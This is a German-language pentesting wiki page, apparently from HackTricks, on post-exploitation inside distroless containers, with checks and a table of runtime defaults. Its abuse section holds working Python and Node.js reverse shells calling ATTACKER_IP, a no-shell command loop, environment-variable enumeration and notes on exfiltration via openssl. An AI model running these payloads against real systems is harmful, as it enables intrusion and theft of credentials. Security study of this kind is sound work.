# Distroless-Container

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Ein **distroless** Container-Image ist ein Image, das die **minimalen Laufzeitkomponenten enthält, die erforderlich sind, um eine einzelne spezifische Anwendung auszuführen**, während bewusst die üblichen Distributionswerkzeuge wie Paketmanager, Shells und große Mengen generischer Userland-Dienstprogramme entfernt werden. In der Praxis enthalten distroless-Images oft nur das Anwendungs-Binärprogramm oder die Runtime, die geteilten Bibliotheken, Zertifikatbündel und ein sehr kleines Dateisystem-Layout.

Der Punkt ist nicht, dass distroless eine neue Kernel-Isolationstechnik ist. Distroless ist eine **Image-Design-Strategie**. Sie ändert, was **innerhalb** des Container-Dateisystems verfügbar ist, nicht wie der Kernel den Container isoliert. Diese Unterscheidung ist wichtig, denn distroless härtet die Umgebung hauptsächlich, indem es reduziert, was ein Angreifer nach Erlangung von Codeausführung nutzen kann. Es ersetzt nicht namespaces, seccomp, capabilities, AppArmor, SELinux oder irgendeinen anderen Laufzeit-Isolationsmechanismus.

## Warum Distroless existiert

Distroless-Images werden hauptsächlich eingesetzt, um zu reduzieren:

- die Image-Größe
- die betriebliche Komplexität des Images
- die Anzahl von Paketen und Binaries, die Schwachstellen enthalten könnten
- die Anzahl an Post-Exploitation-Tools, die einem Angreifer standardmäßig zur Verfügung stehen

Deshalb sind distroless-Images in Produktionsanwendungs-Deployments beliebt. Ein Container, der keine Shell, keinen Paketmanager und fast kein generisches Werkzeug enthält, ist in der Regel operativ leichter zu durchdenken und nach einer Kompromittierung schwerer interaktiv zu missbrauchen.

Beispiele für bekannte distroless-artige Image-Familien sind:

- Google's distroless images
- Chainguard hardened/minimal images

## Was Distroless nicht bedeutet

Ein distroless-Container ist **nicht**:

- automatisch rootless
- automatisch nicht-privilegiert
- automatisch schreibgeschützt
- automatisch durch seccomp, AppArmor oder SELinux geschützt
- automatisch sicher vor Container-Escape

Es ist weiterhin möglich, ein distroless-Image mit `--privileged`, Host-Namespace-Sharing, gefährlichen bind mounts oder einem gemounteten Runtime-Socket zu starten. In diesem Szenario mag das Image minimal sein, aber der Container kann trotzdem katastrophal unsicher sein. Distroless ändert die **Userland-Angriffsfläche**, nicht die **Kernel-Vertrauensgrenze**.

## Typische betriebliche Eigenschaften

Wenn Sie einen distroless-Container kompromittieren, fällt meist als erstes auf, dass gängige Annahmen nicht mehr zutreffen. Es kann kein `sh`, kein `bash`, kein `ls`, kein `id`, kein `cat` geben, und manchmal nicht einmal eine libc-basierte Umgebung, die sich so verhält, wie Ihre übliche tradecraft es erwartet. Das betrifft sowohl Offensive als auch Defensive, weil der Mangel an Werkzeugen Debugging, Incident Response und Post-Exploitation verändert.

Die häufigsten Muster sind:

- die Anwendungs-Runtime ist vorhanden, aber sonst kaum etwas
- shell-basierte Payloads schlagen fehl, weil keine Shell vorhanden ist
- gängige Enumeration-One-Liner funktionieren nicht, weil die Hilfsbinaries fehlen
- Dateisystem-Schutzmechanismen wie ein read-only rootfs oder `noexec` auf beschreibbaren tmpfs-Orten sind oft ebenfalls vorhanden

Genau diese Kombination führt meistens dazu, dass Leute von "weaponizing distroless" sprechen.

## Distroless und Post-Exploitation

Die größte offensive Herausforderung in einer distroless-Umgebung ist nicht immer das initiale RCE. Oft ist es das, was danach kommt. Wenn der ausgenutzte Workload Codeausführung in einer Language-Runtime wie Python, Node.js, Java oder Go liefert, können Sie möglicherweise beliebige Logik ausführen, aber nicht über die normalen shell-zentrierten Workflows, die bei anderen Linux-Zielen üblich sind.

Das bedeutet, dass sich Post-Exploitation oft in eine von drei Richtungen verschiebt:

1. **Die vorhandene Language-Runtime direkt nutzen**, um die Umgebung zu enumerieren, Sockets zu öffnen, Dateien zu lesen oder zusätzliche Payloads zu stagen.
2. **Eigene Tools in den Speicher laden**, falls das Dateisystem schreibgeschützt ist oder beschreibbare Orte mit `noexec` gemountet sind.
3. **Vorhandene Binaries im Image missbrauchen**, falls die Anwendung oder ihre Abhängigkeiten etwas unerwartet Nützliches enthalten.

## Missbrauch

### Die vorhandene Runtime enumerieren

In vielen distroless-Containern gibt es keine Shell, aber trotzdem eine Anwendungs-Runtime. Wenn das Ziel ein Python-Service ist, ist Python vorhanden. Wenn das Ziel Node.js ist, ist Node vorhanden. Das liefert oft genug Funktionalität, um Dateien zu enumerieren, Environment-Variablen zu lesen, reverse shells zu öffnen und In-Memory-Ausführung zu stagen, ohne jemals `/bin/sh` aufzurufen.

Ein einfaches Beispiel mit Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Ein einfaches Beispiel mit Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Auswirkungen:

- Wiederherstellung von Umgebungsvariablen, häufig inklusive Zugangsdaten oder Service-Endpunkten
- Auflistung des Dateisystems ohne `/bin/ls`
- Identifizierung beschreibbarer Pfade und eingehängter Secrets

### Reverse Shell ohne `/bin/sh`

Wenn das Image `sh` oder `bash` nicht enthält, kann eine klassische, auf einer Shell basierende reverse shell sofort fehlschlagen. In diesem Fall verwenden Sie stattdessen die installierte Laufzeitumgebung der Sprache.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Wenn `/bin/sh` nicht existiert, ersetzen Sie die letzte Zeile durch eine direkte, von Python gesteuerte Befehlsausführung oder eine Python-REPL-Schleife.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Nochmal: Wenn `/bin/sh` nicht vorhanden ist, verwende direkt Node's filesystem-, process- und networking-APIs, anstatt eine shell zu starten.

### Vollständiges Beispiel: No-Shell Python Command Loop

Wenn das Image Python enthält, aber überhaupt keine shell, ist eine einfache interaktive Schleife oft ausreichend, um die volle post-exploitation capability aufrechtzuerhalten:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Dies erfordert kein interactive shell binary. Aus Sicht des Angreifers ist die Auswirkung de facto die gleiche wie bei einer basic shell: command execution, enumeration und staging weiterer payloads über die vorhandene runtime.

### In-Memory Tool-Ausführung

Distroless-Images werden oft kombiniert mit:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Diese Kombination macht klassische "download binary to disk and run it"-Workflows unzuverlässig. In solchen Fällen werden memory execution techniques zur Hauptlösung.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Bereits vorhandene Binaries im Image

Einige Distroless-Images enthalten noch betrieblich notwendige binaries, die nach einem Kompromiss nützlich werden. Ein wiederholt beobachtetes Beispiel ist `openssl`, da Anwendungen es manchmal für crypto- oder TLS-bezogene Aufgaben benötigen.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Wenn `openssl` vorhanden ist, kann es verwendet werden für:

- ausgehende TLS-Verbindungen
- data exfiltration über einen erlaubten egress channel
- staging von payload-Daten durch encoded/encrypted blobs

Der genaue Missbrauch hängt davon ab, was tatsächlich installiert ist, aber die allgemeine Idee ist, dass distroless nicht 'keine Tools überhaupt' bedeutet; es bedeutet 'deutlich weniger Tools als ein normales Distribution-Image'.

## Checks

Ziel dieser Checks ist es festzustellen, ob das Image in der Praxis wirklich distroless ist und welche runtime- oder helper-Binaries noch für post-exploitation verfügbar sind.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Was hier interessant ist:

- Wenn keine Shell existiert, aber eine Runtime wie Python oder Node vorhanden ist, sollte sich post-exploitation auf runtime-gesteuerte Ausführung verlagern.
- Wenn das Root-Dateisystem read-only ist und `/dev/shm` beschreibbar aber mit `noexec` versehen ist, werden memory execution techniques deutlich relevanter.
- Wenn Hilfs-Binaries wie `openssl`, `busybox` oder `java` vorhanden sind, können sie genug Funktionalität bieten, um weitergehenden Zugriff zu bootstrapen.

## Runtime-Standardwerte

| Image / platform style | Standardzustand | Typisches Verhalten | Gängige manuelle Abschwächungen |
| --- | --- | --- | --- |
| Google distroless style images | Minimaler Userland-Umfang per Design | Keine Shell, kein Paketmanager, nur Anwendungs-/Runtime-Abhängigkeiten | Hinzufügen von Debugging-Layern, Sidecar-Shells, Kopieren von busybox oder Tools |
| Chainguard minimal images | Minimaler Userland-Umfang per Design | Reduzierte Paketoberfläche, oft auf eine Runtime oder einen Service fokussiert | Verwendung von `:latest-dev` oder Debug-Varianten, Kopieren von Tools zur Build-Zeit |
| Kubernetes workloads using distroless images | Hängt von der Pod-Konfiguration ab | Distroless betrifft nur das Userland; die Sicherheitslage des Pods hängt weiterhin von der Pod-Spezifikation und den Runtime-Standardeinstellungen ab | Hinzufügen ephemerer Debug-Container, Host-Mounts, privilegierte Pod-Einstellungen |
| Docker / Podman running distroless images | Hängt von den Run-Flags ab | Minimales Dateisystem, aber die Runtime-Sicherheit hängt weiterhin von Flags und der Daemon-Konfiguration ab | `--privileged`, Teilen von Host-Namespaces, Mounts des Runtime-Sockets, schreibbare Host-Binds |

Der entscheidende Punkt ist, dass distroless eine **Image-Eigenschaft** ist, keine Runtime-Schutzmaßnahme. Sein Wert liegt darin, zu reduzieren, was nach einem Kompromiss im Dateisystem verfügbar ist.

## Verwandte Seiten

Für filesystem und memory-execution bypasses, die in distroless-Umgebungen häufig benötigt werden:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Für container runtime, socket, und mount abuse, die weiterhin auf distroless-Workloads zutreffen:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
